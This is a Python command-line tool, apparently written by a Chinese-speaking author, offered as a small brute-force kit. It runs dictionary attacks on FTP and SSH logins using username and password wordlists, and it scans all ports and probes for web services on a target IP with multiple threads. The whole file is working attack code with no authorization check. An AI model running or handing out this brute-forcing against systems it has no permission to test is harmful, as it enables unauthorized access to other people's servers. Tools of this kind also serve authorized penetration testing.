import ftplib
import queue
import threading
import sys
import socket
import paramiko
import requests


def ftp_baopo(ip, user_dic, password_dic):
    with open(user_dic) as users:
        user_list = users.read().splitlines()
    with open(password_dic) as passwords:
        password_list = passwords.read().splitlines()

    for f_u in user_list:
        for f_p in password_list:
            try:
                ftp = ftplib.FTP()
                ftp.connect(ip, 21, timeout=5)
                ftp.login(f_u, f_p)
                print(f'[+++FTP] {f_u} ---> {f_p} success')
            except Exception as e:
                print(f'[-FTP] {f_u} ---> {f_p} failed: {e}')
            finally:
                if 'ftp' in locals():
                    ftp.quit()


def ssh_baopo(ip, user_dic, password_dic):
    with open(user_dic) as users:
        user_list = users.read().splitlines()
    with open(password_dic) as passwords:
        password_list = passwords.read().splitlines()

    for f_u in user_list:
        for f_p in password_list:
            try:
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                ssh.connect(ip, port=22, username=f_u, password=f_p, timeout=5)
                print(f'[+++SSH] {f_u} ---> {f_p} success')
            except Exception as e:
                print(f'[-SSH] {f_u} ---> {f_p} failed: {e}')
            finally:
                if 'ssh' in locals():
                    ssh.close()


def ip_scan(ip, q):
    while not q.empty():
        port = q.get()
        try:
            s = socket.socket()
            s.settimeout(3)
            s.connect((ip, port))
            print(f"{ip}:{port} open")
            with open('port_open.txt', 'a') as f:
                f.write(f"{ip}:{port}\n")
        except Exception:
            print(f"{ip}:{port} closed")
        finally:
            s.close()
            q.task_done()


def web_scan(ip, q):
    while not q.empty():
        port = q.get()
        url = f'http://{ip}:{port}'
        urls = f'https://{ip}:{port}'
        try:
            req = requests.get(url, timeout=3)
            if req.status_code == 200:
                print(f'[+++Web]--->Find--->{url}')
                with open('http_web.txt', 'a') as f:
                    f.write(url + '\n')
        except requests.exceptions.RequestException:
            print(f'[---Web]--->Find--->{url}')

        try:
            req1 = requests.get(urls, timeout=3)
            if req1.status_code == 200:
                print(f'[+++Web]--->Find--->{urls}')
                with open('https_web.txt', 'a') as f:
                    f.write(urls + '\n')
        except requests.exceptions.RequestException:
            print(f'[---Web]--->Find--->{urls}')

        finally:
            q.task_done()


def duankou(q):
    mode = input('选择端口扫描模式 (1: 全端口, 2: 自定义端口): ')
    if mode == '1':
        for i in range(1, 65536):
            q.put(i)
    elif mode == '2':
        custom_ports = input('请输入自定义端口，用逗号分隔: ')
        ports = custom_ports.split(',')
        for port in ports:
            try:
                q.put(int(port.strip()))
            except ValueError:
                print(f"无效端口: {port}")
    else:
        print('无效选择，请输入1或2')


if __name__ == '__main__':
    q = queue.Queue()

    print('此工具是一款小型的爆破工具，目前支持 ssh/ftp/burst端口爆破 -->> 这三种爆破 ')
    print('-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=')
    print('使用方法如下:-------------------------------------------------------')
    print('-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=')
    print('eg:   python xxx.py ssh/ftp/ user.txt password.txt ---> ftp爆破/ssh爆破 + 字典路径')
    print('eg:   python xxx.py burst  --->  设输入IP，设置完线程即可全端口扫描 ')
    print('--------------------------------------------------- by ------->  0x4f5da2')

    if len(sys.argv) < 2:
        print('参数错误! 请输入: ftp/ssh/burst')
        sys.exit(1)

    chose = sys.argv[1]

    if chose == 'ftp':
        if len(sys.argv) < 5:
            print('参数错误! 请输入: ftp IP user.txt password.txt')
            sys.exit(1)
        ip = sys.argv[2]
        user_dic = sys.argv[3]
        password_dic = sys.argv[4]
        ftp_baopo(ip, user_dic, password_dic)

    elif chose == 'ssh':
        if len(sys.argv) < 5:
            print('参数错误! 请输入: ssh IP user.txt password.txt')
            sys.exit(1)
        ip = sys.argv[2]
        user_dic = sys.argv[3]
        password_dic = sys.argv[4]
        ssh_baopo(ip, user_dic, password_dic)

    elif chose == 'burst':
        ip = input('请输入你想要爆破的IP: ')
        th_um = input('请输入你想要爆破的线程: ')
        mode_high = input('选择爆破模式(1.web探测，2.开发端口扫描): ')
        duankou(q)

        try:
            num_threads = int(th_um)
        except ValueError:
            print('线程数必须为整数')
            sys.exit(1)

        threads = []
        if mode_high == '1':
            for _ in range(num_threads):
                t = threading.Thread(target=web_scan, args=(ip, q))
                t.start()
                threads.append(t)
        elif mode_high == '2':
            for _ in range(num_threads):
                t = threading.Thread(target=ip_scan, args=(ip, q))
                t.start()
                threads.append(t)

        for t in threads:
            t.join()

    else:
        print('参数错误! 请输入: ftp/ssh/burst')
